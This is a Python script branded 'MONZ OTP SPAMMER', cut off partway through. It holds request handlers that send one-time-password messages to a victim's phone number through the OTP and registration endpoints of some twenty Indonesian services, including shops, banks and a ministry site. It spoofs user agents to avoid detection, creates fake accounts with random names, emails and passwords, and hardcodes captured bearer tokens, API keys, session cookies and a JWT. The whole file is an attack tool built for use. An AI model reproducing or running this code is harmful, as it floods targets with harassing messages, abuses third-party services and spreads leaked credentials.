#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  MONZ OTP SPAMMER - MEGA EDITION
#  by MONZ | 39+ Platform | No Filter
# ============================================================

import requests
import re
import time
import random
import urllib.parse
import sys
import json
import uuid
import string
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
# COLOR - MONZ THEME (MAGENTA + CYAN)
# ============================================================
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# ============================================================
# BANNER MONZ - MAGENTA/CYAN THEME
# ============================================================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"""
{Color.MAGENTA}  ███╗   ███╗ ██████╗ ███╗   ██╗███████╗
{Color.MAGENTA}  ████╗ ████║██╔═══██╗████╗  ██║╚══███╔╝
{Color.MAGENTA}  ██╔████╔██║██║   ██║██╔██╗ ██║  ███╔╝ 
{Color.MAGENTA}  ██║╚██╔╝██║██║   ██║██║╚██╗██║ ███╔╝  
{Color.MAGENTA}  ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗
{Color.MAGENTA}  ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
{Color.RESET}
{Color.CYAN}  ⚡ OTP SPAMMER MEGA - GACOR FIX ⚡{Color.RESET}
{Color.MAGENTA}  by MONZ • 39+ Platform • No Filter • v2.0{Color.RESET}
""")

# ============================================================
# LOADING ANIMATION MONZ
# ============================================================
def loading(text="MONZ LOADING", duration=1.5):
    chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    colors = [Color.MAGENTA, Color.CYAN, Color.GREEN, Color.YELLOW]
    
    end = time.time() + duration
    i = 0
    while time.time() < end:
        color = colors[i % len(colors)]
        sys.stdout.write(f'\r{color}🌀 {chars[i % len(chars)]} {text}...{Color.RESET}')
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    print('\r' + ' ' * 40 + '\r', end='')

# ============================================================
# SPINNER MONZ
# ============================================================
def spinner_monz(text="Processing", duration=1):
    chars = ['◐', '◓', '◑', '◒']
    colors = [Color.MAGENTA, Color.CYAN, Color.GREEN]
    
    end = time.time() + duration
    i = 0
    while time.time() < end:
        color = colors[i % len(colors)]
        sys.stdout.write(f'\r{color}⚡ {chars[i % len(chars)]} {text}...{Color.RESET}')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    print('\r' + ' ' * 40 + '\r', end='')

# ============================================================
# PROGRESS BAR MONZ
# ============================================================
def progress_bar_monz(current, total, text="Progress"):
    percent = int((current / total) * 100)
    bar_length = 30
    filled = int(bar_length * percent / 100)
    bar = "█" * filled + "░" * (bar_length - filled)
    
    sys.stdout.write(f'\r{Color.MAGENTA}📊 {text}: {Color.CYAN}[{bar}]{Color.RESET} {Color.GREEN}{percent}%{Color.RESET}')
    sys.stdout.flush()

# ============================================================
# TYPEWRITER EFFECT MONZ
# ============================================================
def typewriter_monz(text, delay=0.03, color=Color.CYAN):
    for char in text:
        sys.stdout.write(f'{color}{char}{Color.RESET}')
        sys.stdout.flush()
        time.sleep(delay)
    print()

# ============================================================
# SUCCESS ANIMATION MONZ
# ============================================================
def success_animation():
    for _ in range(3):
        sys.stdout.write(f'\r{Color.GREEN}✨ SUKSES! ✨{Color.RESET}')
        sys.stdout.flush()
        time.sleep(0.3)
    print()

# ============================================================
# ERROR ANIMATION MONZ
# ============================================================
def error_animation():
    for _ in range(3):
        sys.stdout.write(f'\r{Color.RED}❌ GAGAL! ❌{Color.RESET}')
        sys.stdout.flush()
        time.sleep(0.3)
    print()

# ============================================================
# USER AGENT
# ============================================================
UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

def get_ua():
    return random.choice(UA_POOL)

def get_ua_desktop():
    return random.choice([u for u in UA_POOL if "Windows" in u or "Macintosh" in u or "Linux x86" in u])

# ============================================================
# NORMALISASI NOMOR
# ============================================================
def normalize_phone(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("62"):
        return "0" + phone[2:]
    if phone.startswith("8"):
        return "0" + phone
    return phone

def to_62(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("0"):
        return "62" + phone[1:]
    if phone.startswith("62"):
        return phone
    return "62" + phone

def to_plus(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("0"):
        return "+62" + phone[1:]
    if phone.startswith("62"):
        return "+" + phone
    return "+" + phone

def to_nocode(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("0"):
        return phone[1:]
    if phone.startswith("62"):
        return phone[2:]
    return phone

def rnd_name():
    return 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

def rnd_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=7))}{random.randint(100,999)}@gmail.com"

# ============================================================
# CEK RESPONSE
# ============================================================
def is_success(resp):
    if resp is None:
        return False, "⏰ Timeout"
    
    code = resp.status_code
    
    if code in [200, 201, 202]:
        try:
            data = resp.json()
            if isinstance(data, dict):
                if data.get("success") is False:
                    return False, data.get("message", "Failed")
                if data.get("error"):
                    return False, str(data.get("error"))
                if data.get("status") == "error":
                    return False, data.get("message", "Error")
            return True, "✅ OK"
        except:
            return True, "✅ OK"
    
    elif code == 400:
        try:
            data = resp.json()
            msg = data.get("message") or data.get("error") or "Bad Request"
            if "captcha" in msg.lower():
                return False, "⚠️ Captcha"
            if "detik" in msg.lower():
                return False, f"⏳ {msg}"
            return False, f"❌ {msg}"
        except:
            return False, "❌ Bad Request"
    
    elif code == 401:
        return False, "🔒 Unauthorized"
    elif code == 403:
        return False, "🚫 Forbidden"
    elif code == 422:
        return False, "⚠️ Validation"
    elif code == 429:
        return False, "🚦 Rate Limit"
    else:
        return False, f"❌ HTTP {code}"

# ============================================================
# HANDLER PLATFORM - DARI HANDLERS.PY + TARGETS.PY + SPAM.PY
# ============================================================

# ---------- 1. ERAFONE ----------
def spam_erafone(phone_62):
    url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    headers = {
        "Host": "jeanne.eraspace.com",
        "otp-client": "erafone",
        "User-Agent": get_ua(),
        "sec-ch-ua-platform": '"Android"',
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "otp-provider": "whatsapp",
        "signature": "d2afc6a94fc469d0633f477ed2a73a155bc379d8d138d5e9885a2b612bb3d077",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "source": "erafone",
        "device-id": str(uuid.uuid4()),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sms-client": "erafone",
        "platform": "erafone-web",
        "Origin": "https://erafone.com",
        "Referer": "https://erafone.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {"identifier": phone_62, "type": "identifier_validation"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 2. INTERNET RAKYAT ----------
def spam_internetrakyat(phone_08):
    url = "https://internetrakyat.id/api/app/auth/send-otp-register"
    headers = {
        "Host": "internetrakyat.id",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "x-api-key": "280999!FTTH",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://internetrakyat.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://internetrakyat.id/auth/register",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {"phone_number": phone_08}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 3. JEMBATANI ----------
def spam_jembatani(phone_08):
    headers = {
        "Host": "api.jembatani.co.id",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "Bearer 4aa440574d1da1687276e697495154499b6eaf6142eaaef007271fcd840aca98",
        "user-agent": get_ua(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://jembatani.co.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://jembatani.co.id/",
    }
    name = rnd_name()
    password = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
    
    # Coba register
    reg_payload = {
        "phone_number": phone_08,
        "name": name,
        "role": "farmer",
        "password": password,
        "password_confirmation": password,
        "consent": "1"
    }
    try:
        reg_resp = requests.post("https://api.jembatani.co.id/v1/register", json=reg_payload, headers=headers, timeout=10)
        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
            return reg_resp
    except:
        pass
    
    # Resend OTP
    resend_payload = {"phone_number": phone_08}
    try:
        return requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json=resend_payload, headers=headers, timeout=10)
    except:
        return None

# ---------- 4. 99.CO ----------
def spam_99co(phone_plus):
    token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcFdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
    
    url = "https://www.99.co/id/api/biz/messaging/otp-events"
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_ua(),
        "Accept-Language": "id,en-US;q=0.9",
        "Origin": "https://www.99.co",
        "Referer": "https://www.99.co/id",
    })
    token = token_static
    
    headers = {
        "Host": "www.99.co",
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.99.co",
        "Referer": "https://www.99.co/id",
        "User-Agent": get_ua(),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
    }
    payload = {
        "brand": "99id",
        "destination_address": phone_plus,
        "type_id": 2
    }
    try:
        return sess.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 5. AUTO2000 ----------
def spam_auto2000(phone_08):
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    session = requests.Session()
    try:
        session.get("https://auto2000.co.id", headers={"User-Agent": get_ua()}, timeout=5)
    except:
        pass
    headers = {
        "Host": "auto2000.co.id",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=PRD,sentry-public_key=a9168ed9e0239b8f02f772e5cb953cbf,sentry-trace_id=fa6fa6d20ca49a4b62badd288ffcfdc3,sentry-transaction=GET%20%2Flogin,sentry-sampled=true,sentry-sample_rand=0.7926218694466494,sentry-sample_rate=1",
        "sentry-trace": "fa6fa6d20ca49a4b62badd288ffcfdc3-8fe0a1fb4d2ae88a-1",
        "User-Agent": get_ua(),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://auto2000.co.id",
        "Referer": "https://auto2000.co.id/login",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    cookies = {
        "system_token": "UeRmUjEnH5N9FEWf1lEAFDqcJ9w",
        "__Host-next-auth.csrf-token": "244fc48aa5bc0f4b221efb6180f81783a8409eb97d7cfbd1862417ecd5e3f828%7Cafcb5605ff19e76229c125b9ddfbee2431be4cf7c369c743bec3e911e920cd22",
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fauto2000.co.id",
    }
    payload = {
        "phoneNumber": phone_08,
        "isCheckOtpLimit": True,
        "uniqueID": phone_08,
        "isLogin": False
    }
    try:
        return session.post(url, headers=headers, cookies=cookies, json=payload, timeout=10)
    except:
        return None

# ---------- 6. WATSONS ----------
def spam_watsons(phone_nocode):
    url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
    headers = {
        "Host": "api.watsons.co.id",
        "cache-control": "no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "expires": "0",
        "queue-target": "https://www.watsons.co.id/id/register",
        "user-agent": get_ua(),
        "if-modified-since": "Fri, 19 Jun 2026 15:39:26 GMT",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "vary": "*",
        "origin": "https://www.watsons.co.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.watsons.co.id/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    cookies = {
        "authorization": "Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "token_type": "guest",
        "PIM-SESSION-ID": "fFENbGdcaOZMa62p",
    }
    payload = {
        "uid": "",
        "action": "GENERAL",
        "countryCode": "62",
        "target": phone_nocode,
        "type": "WHATSAPP"
    }
    try:
        return requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=10)
    except:
        return None

# ---------- 7. DUNIAGAMES ----------
def spam_duniagames(phone_plus):
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://duniagames.co.id",
        "Referer": "https://duniagames.co.id/",
        "x-device": str(uuid.uuid4()),
    }
    payload = {"phoneNumber": phone_plus, "userName": phone_plus[3:]}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 8. MATAHARI ----------
def spam_matahari(phone_08):
    url = "https://matahari-backend-prod.matahari.com/api/auth/register"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://matahari.com",
    }
    payload = {
        "emailAddress": rnd_email(),
        "name": rnd_name(),
        "mobileCountryCode": "",
        "mobileNumber": phone_08,
        "birthDate": "2000-01-01",
        "genderId": "1",
        "password": 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1',
        "cardNumber": "",
        "referralCode": "",
        "salesmanId": "",
        "pickupStoreCode": "",
        "marketingCode": "",
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 9. PAPER.ID ----------
def spam_paper(phone_62):
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://paper.id",
        "x-paper-user-agent": "multiverse/2.54.1 mobile_web (android) chrome",
    }
    payload = {"phone": phone_62, "method": "whatsapp", "registered_by": "flutter mweb"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 10. BONUS BELANJA ----------
def spam_bonusbelanja(phone_62):
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bonusbelanja.com",
        "Referer": "https://www.bonusbelanja.com/register/",
    }
    payload = {"phone": phone_62, "name": rnd_name(), "agreeTnc": True, "agreeContact": True}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 11. PTSP KEMENAG ----------
def spam_ptsp_kemenag(phone_08):
    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://dev-ptsp.kemenag.go.id",
        "Referer": "https://dev-ptsp.kemenag.go.id/login",
    }
    digits = ''.join(random.choices(string.digits, k=3))
    letters = ''.join(random.choices(string.ascii_letters, k=3))
    payload = {
        "nama": rnd_name(),
        "wa": phone_08,
        "email": rnd_email(),
        "password": 'Pass' + digits + letters + '$',
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 12. HRS-BRE ----------
def spam_hrsbre(phone_08):
    try:
        session = requests.Session()
        base = "https://career.hrs-bre.site"
        headers_get = {
            "User-Agent": get_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9",
        }
        resp = session.get(f"{base}/auth/sign_up", headers=headers_get, timeout=10)
        if resp.status_code != 200:
            return None
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        nik = ''.join(random.choices(string.digits, k=16))
        pw = "Aa1" + ''.join(random.choices(string.ascii_letters + string.digits, k=7))
        body = (f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n"
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"email\"\r\n\r\n{rnd_email()}\r\n"
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone_08}\r\n"
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"username\"\r\n\r\n{''.join(random.choices(string.ascii_letters, k=8))}\r\n"
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"password\"\r\n\r\n{pw}\r\n"
                f"--{boundary}--\r\n")
        headers_post = {
            "User-Agent": get_ua(),
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": base,
            "Referer": f"{base}/auth/sign_up",
        }
        return session.post(f"{base}/auth/sign_up_action", headers=headers_post, data=body, timeout=10)
    except:
        return None

# ---------- 13. SHOPEE ----------
def spam_shopee(phone_plus):
    url = "https://shopee.co.id/api/v1/account/phone/request_otp"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://shopee.co.id",
        "Referer": "https://shopee.co.id/",
        "x-api-source": "pc",
    }
    payload = {"phone": phone_plus, "request_id": str(uuid.uuid4()), "source": "login"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 14. LAZADA ----------
def spam_lazada(phone_plus):
    url = "https://auth.lazada.co.id/rest/auth/otp/generate"
    headers = {
        "User-Agent": get_ua_desktop(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://auth.lazada.co.id",
        "Referer": "https://auth.lazada.co.id/",
    }
    payload = {"mobile": phone_plus, "type": "login", "action": "whatsapp"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 15. BUKALAPAK ----------
def spam_bukalapak(phone_plus):
    url = "https://api.bukalapak.com/v2/otp.json"
    headers = {
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bukalapak.com",
        "Referer": "https://www.bukalapak.com/",
    }
    payload = {"phone": phone_plus, "type": "whatsapp", "method": "send_otp"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 16. BCA ----------
def spam_bca(phone_08):
    url = "https://api.bca.co.id/otp/request"
    headers = {
        "User-Agent": get_ua_desktop(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bca.co.id",
        "Referer": "https://www.bca.co.id/",
    }
    payload = {"msisdn": phone_08, "type": "whatsapp", "channel": "otp"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 17. MANDIRI ----------
def spam_mandiri(phone_08):
    url = "https://api.bankmandiri.co.id/otp/send"
    headers = {
        "User-Agent": get_ua_desktop(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bankmandiri.co.id",
        "Referer": "https://www.bankmandiri.co.id/",
    }
    payload = {"phone": phone_08, "type": "whatsapp", "channel": "otp"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 18. BRI ----------
def spam_bri(phone_08):
    url = "https://api.bri.co.id/otp/send"
    headers = {
        "User-Agent": get_ua_desktop(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bri.co.id",
        "Referer": "https://www.bri.co.id/",
    }
    payload = {"phoneNumber": phone_08, "type": "whatsapp"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 19. KLOOK ----------
def spam_klook(phone_plus):
    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
    headers = {
        "Host": "www.klook.com",
        "x-klook-user-residence": "15_SG",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "x-klook-request-id": str(uuid.uuid4())[:12].replace('-','')[:6] + "_" + str(uuid.uuid4())[:6].replace('-',''),
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=production,sentry-release=usercenter_20260604_684061b7,sentry-public_key=d39c561235fbd838c4dc84cd11977fb9,sentry-trace_id=0aad749014c94a31be835687fe4834c7",
        "sentry-trace": "0aad749014c94a31be835687fe4834c7-865f051a00519a68",
        "x-klook-page-open-id": "",
        "x-klook-host": "www.klook.com",
        "x-requested-with": "XMLHttpRequest",
        "x-klook-traffic-channel": "aid_87721",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "token": "",
        "x-klook-affiliate-aid": "87721",
        "x-platform": "mobile",
        "cache-control": "no-cache",
        "x-klook-kepler-id": str(uuid.uuid4()),
        "accept-language": "en_SG",
        "currency": "SGD",
        "x-klook-tint": '{}',
        "user-agent": get_ua(),
        "x-klook-affiliate-pid": "",
        "x-klook-market": "global",
        "version": "5.6",
        "_pt": str(uuid.uuid4()),
        "origin": "https://www.klook.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.klook.com/en-SG/signin/?aid=87721",
    }
    cookies = {
        "kepler_id": str(uuid.uuid4()),
        "klk_currency": "SGD",
        "klk_rdc": "SG",
        "k_tff_ch": "aid_87721",
        "_gid": "GA1.2." + str(random.randint(1000000000,9999999999)),
        "klk_sessionid": "MQ." + str(uuid.uuid4().hex)[:32],
        "_ga": "GA1.1." + str(random.randint(1000000000,9999999999)) + "." + str(int(time.time())),
    }
    payload = {
        "action": "login_register",
        "type": 1,
        "rcv": phone_plus,
        "is_resend": False,
        "payload": {
            "mobile": phone_plus,
            "term_ids": [330],
            "mobile_token": "",
            "invite_code": ""
        },
        "_rc": "",
        "rcv_token": ""
    }
    try:
        return requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=10)
    except:
        return None

# ---------- 20. MAULAGI ----------
def spam_maulagi(phone_08):
    url = "https://api.maulagi.id/api/v2/auth/check"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://maulagi.id",
        "x-ml-key": "C59RUHBU59",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": get_ua(),
    }
    payload = {"credentials": phone_08}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 21. RUMAH123 ----------
def spam_rumah123(phone_nocode, ip="127.0.0.1"):
    url = "https://www.rumah123.com/api/otp/request-otp"
    headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://www.rumah123.com",
        "base-url-core": "https://www.rumah123.com",
        "User-Agent": get_ua(),
    }
